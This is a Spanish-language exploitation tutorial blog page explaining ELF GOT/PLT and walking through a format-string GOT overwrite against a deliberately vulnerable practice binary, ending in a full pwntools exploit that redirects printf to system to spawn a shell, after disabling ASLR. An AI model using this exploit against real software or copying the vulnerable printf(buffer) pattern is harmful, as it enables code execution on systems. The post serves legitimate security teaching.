<!DOCTYPE html> <!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--> <!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"><!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"> <title>GOT overwrite con Format String &#8211; c4rta</title> <meta name="description" content="Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones"> <meta name="keywords" content="Explotacion Binaria, GOT overwrite, format string"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/logo7.jpg"> <meta name="twitter:title" content="GOT overwrite con Format String"> <meta name="twitter:description" content="En este articulo veremos un ejemplo muy simple de como sobreescribir GOT aprovechandonos de una vulnerabilidad format string, sobresrcibiremos la direccion de GOT de printf"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="GOT overwrite con Format String"> <meta property="og:description" content="En este articulo veremos un ejemplo muy simple de como sobreescribir GOT aprovechandonos de una vulnerabilidad format string, sobresrcibiremos la direccion de GOT de printf"> <meta property="og:url" content="http://localhost:4000/got-overwrite/"> <meta property="og:site_name" content="c4rta"> <meta property="og:image" content="http://localhost:4000/assets/img/logo7.jpg"> <link rel="canonical" href="http://localhost:4000/got-overwrite/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="c4rta Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png" /> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico" /> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/logo7.jpg" alt="c4rta photo" class="author-photo"> <h4>c4rta</h4> <p>Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="http://github.com/ic4rta" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul><!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> </ul><!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>GOT overwrite con Format String</h1> <h4>30 Jul 2022</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~6 minutes </p><!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <p>En este articulo veremos un ejemplo muy simple de como sobreescribir GOT aprovechandonos de una vulnerabilidad format string, sobresrcibiremos la direccion de GOT de printf</p> <h2 id="got-y-plt">GOT y PLT</h2> <p>Para entender esto mejor veremos la estructura de un binario ELF.</p> <p><img src="/assets/img/formatString-got/elf.png" alt="" /></p> <p>Ahora pondre otra estructura donde <code class="language-plaintext highlighter-rouge">section header table</code> apunta a la seccion <code class="language-plaintext highlighter-rouge">.text</code> , <code class="language-plaintext highlighter-rouge">.radata</code> y <code class="language-plaintext highlighter-rouge">.data</code> del binario, si se dan cuenta la estructura de arriba es mas extensa que la de abajo, esto es por que un archivo ELF tiene dos vistas, <code class="language-plaintext highlighter-rouge">Program header table</code> donde muestra los segmentos utilizados en tiempo de ejecución, y la otra es <code class="language-plaintext highlighter-rouge">section header table</code> que enumera el conjunto de secciones, simplemente en la imagen de arriba no se muesta explicitamente <code class="language-plaintext highlighter-rouge">section header table</code>, pero ambas estructuras son correctas</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>|----------------------|
|      ELF header      |
|----------------------|
| Program header table |
|----------------------|
|        .text         | &lt;--|
|----------------------|    |
|        .rodata       | &lt;--|
|----------------------|    |
|        .data         | &lt;--|
|----------------------|    |
| section header table | ---|
|----------------------|

</code></pre></div> <h3 id="direcciones-de-los-simbolos">Direcciones de los simbolos</h3> <p>En un binario ELF una seccion de texto necesita saber la direccion virtual absoluta de un simbolo (como por ejemplo una funcion o variable), esto surge de una operacion donde se toma una direccion o una entrada a PLT, por ejemplo una direccion puede ser esto:</p> <ul> <li>Una constante de tiempo de enlace</li> <li>La base de carga más una constante de tiempo de enlace.</li> </ul> <p>Si se dieron cuenta se menciona la palabra <code class="language-plaintext highlighter-rouge">enlace</code> y esto es por que GOT y PLT se encargan de la gran parte del enlazado dinamico.</p> <p>Imaginemos una situacion donde tomamos el valor de un simbolo, para poder realizar esto tenemos que hacer que el enlazador dinamico busque la direccion en memoria de ese simbolo y reescriba el codigo para solo poder carga una sola direccion, esto es demasiado proceso e incluso aumenta el tamaño del binario, asi que una mejora mucho mas eficiente y eficaz es reservar un espacio en la memoria del binario en la cual se mantendra la direccion de ese simbolo y posteriormente hacer que el enlazador dinamico ponga la direccion alli en lugar de reescribir todo el codigo, esto es gracias a que existe GOT, y GOT se encuenta en una seccion el binario que se llama .got, se puede ver en la primera imagen.</p> <h3 id="como-trabaja-got-y-plt">¿Como trabaja GOT y PLT?</h3> <p>GOT trabaja de la siguiente manera, primero GOT se abre como un enlazador dinamico durante la ejecucion del binario, posteriormente obtiene las direcciones absolutas de las funciones solicitadas y GOT se actualiza asi mismo segun lo que fue solicitado, despues toma las solicitudes de las ubicaciones que vienen por parte de PLT, una vez que esto se concluya tenemos el paso final en el cual PLT esta vinculado con la direccion de GOT, entonces ahora el binario puede llamar directamente a esa funcion que fue solicitada desde las librerias. Definitivamente GOT y PLT son los mejores amigos.</p> <h3 id="un-pequeño-ejemplo">Un pequeño ejemplo</h3> <p>El codigo del ejemplo es el siguiente, compilenlo como quieran, ese no es el que se va a explotar, simplemente solo es para ver como se representaria GOT y PLT en debugger:</p> <div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
        <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div> <p>Lo que hace este pequeño programa es obtener nuestro input y meterlo en el buffer de 8 bytes usando la funcion <code class="language-plaintext highlighter-rouge">gets</code> para posteriormente imprimirlo con la funcion <code class="language-plaintext highlighter-rouge">puts</code>, pasaremos a meter el binario a gdb y a mostrar el main</p> <p><img src="/assets/img/formatString-got/got%26plt.png" alt="" /></p> <p>Podemos visualizar algo como esto, donde se ve que tenemos dos entradas de PLT y ahora nuestas funciones de <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code> pasaron a <code class="language-plaintext highlighter-rouge">gets@plt</code> y <code class="language-plaintext highlighter-rouge">puts@plt</code> y esto es por que no se sabe con exactitud donde esta <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code>por lo que salta a PLT</p> <p><strong><em>A tomar en cuenta:</em></strong></p> <ul> <li> <p>En caso de que haya una entrada para <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code>, ambas funciones saltaran a la direccion que esta almacenada alli</p> </li> <li> <p>Las direcciones en memoria de las funciones de libc, como <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code> estan almacenadas en GOT, ya que GOT es una gran tabla de direcciones</p> </li> </ul> <h3 id="como-nos-podemos-aprovechar-de-esto">¿Como nos podemos aprovechar de esto?</h3> <p>Si tenemos una entrada PLT que sea de una funcion de libc, podemos redirigir la entrada PLT hacia otra parte</p> <h3 id="got-overwrite">GOT overwrite</h3> <p>Esta tecnica consiste en sobreecribir la direccion de GOT de una funcion por una direccion que nosotros queramos, por ejemplo en nuestro binario que vamos a explotar nos vamos a aprovechar de la funcion <code class="language-plaintext highlighter-rouge">printf</code>, entonces si sobreescribe la direccion GOT de <code class="language-plaintext highlighter-rouge">printf</code> por cualquier otra lo que va a pasar es que PLT va a adquirir la direccion GOT que sobreescribimos y ejecuta a lo que hayamos indicado.</p> <h2 id="analisis-del-binario">Analisis del binario</h2> <p>Primeramente desactivamos el ASRL con:</p> <p><code class="language-plaintext highlighter-rouge">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p> <p>El binario usado lo saque de: <code class="language-plaintext highlighter-rouge">https://ir0nstone.gitbook.io/notes/</code>, todo el credito para <code class="language-plaintext highlighter-rouge">Andrej (aka ir0nstone)</code></p> <div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">300</span><span class="p">];</span>
    
    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">vuln</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div> <p>Lo que haces el binario es mantenerse en un bucle infinito recibiendo nuestros inputs con <code class="language-plaintext highlighter-rouge">fgets</code> y mostrandolos con <code class="language-plaintext highlighter-rouge">printf</code> asi que no podemos hacer BoF, si vemos las protecciones del binario lo unico que tenemos activado es PIE pero realmente no nos interesa si esta activado o no.</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
</code></pre></div> <h2 id="calculando-el-offset-del-buffer-y-la-direccion-de-libc">Calculando el offset del buffer y la direccion de libc</h2> <h3 id="direccion-de-libc">Direccion de libc</h3> <p>Para esto solamente usaremos el comando ldd, y queda asi <code class="language-plaintext highlighter-rouge">ldd got_overwrite-32</code>, nos motrara algo como esto</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>	linux-gate.so.1 (0xf7fc3000)
	libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7c00000)
	/lib/ld-linux.so.2 =&gt; /usr/lib/ld-linux.so.2 (0xf7fc5000)
</code></pre></div> <p>Donde la direccion de libc es <code class="language-plaintext highlighter-rouge">0xf7c00000</code></p> <h3 id="calculando-el-offset-del-buffer">Calculando el offset del buffer</h3> <p>Viendo que se esta imprimiendo la variable buffer de esta forma <code class="language-plaintext highlighter-rouge">printf(buffer)</code> podemos hace uso de format string, de hecho si le pasamos unos cuantos format string lo que hara es buscar valores de la memoria e imprimirlos como vemos en la imagen</p> <p><img src="/assets/img/formatString-got/format1.png" alt="" /></p> <p>Para saber el offset el buffer tenemos que pasarle algunas A en conjunto de unos format string, de esta manera <code class="language-plaintext highlighter-rouge">AAAAAAAA %p %p %p %p %p %p %p</code> esto con el fin de ver desde donde se estan inprimiendo nuestras A, esto nos imprime lo siguiente</p> <p><img src="/assets/img/formatString-got/format2.png" alt="" /></p> <p>Entonces si empezamos a contar desde <code class="language-plaintext highlighter-rouge">0x12c</code> hasta donde tengo seleccionado en la imagen, nos da 5, entonces el offset del buffer es 5.</p> <h2 id="armando-nuestro-exploit">Armando nuestro exploit</h2> <p>El exploit queda de la siguiente manera</p> <div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./got_overwrite-32'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="mh">0xf7c00000</span>   

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./got_overwrite-32"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span> <span class="p">:</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]})</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div> <p>Si vemos en esta parte</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
</code></pre></div> <p>El numero 5 es el offset del buffer, lo que estamos haciendo aqui <code class="language-plaintext highlighter-rouge">elf.got['printf']</code> es sacar la direccion GOT de <code class="language-plaintext highlighter-rouge">printf</code> y sustuirla por la de system, y mas abajo se llama de esta manera <code class="language-plaintext highlighter-rouge">p.sendline('/bin/sh')</code> ya que es lo que queremos ejecutar</p> <p>Y ahora si ejecutamos el exploit debimos de obtener una shell</p> <p><img src="/assets/img/formatString-got/format4.png" alt="" /></p> <p>Eso ha sido todo, gracias por leer ❤</p> <p><img src="/assets/img/formatString-got/waifu.jpg" alt="" /></p> <div class="entry-meta"> <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#Explotacion Binaria" title="Pages tagged Explotacion Binaria" class="tag"><span class="term">Explotacion Binaria</span></a><a href="http://localhost:4000/tags/#GOT overwrite" title="Pages tagged GOT overwrite" class="tag"><span class="term">GOT overwrite</span></a><a href="http://localhost:4000/tags/#format string" title="Pages tagged format string" class="tag"><span class="term">format string</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/got-overwrite/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Share</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/got-overwrite/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/got-overwrite/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <!----> <section id="utterances_thread" class="animated fadeInUp"> <script src="https://utteranc.es/client.js" repo="ic4rta/ic4rta.github.io" issue-term="pathname" label="Publicaciones" theme="github-light" crossorigin="anonymous" async> </script> </section> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <script type="text/javascript"> var disqus_shortname = 'https-ic4rta-github-io'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> </body> </html>
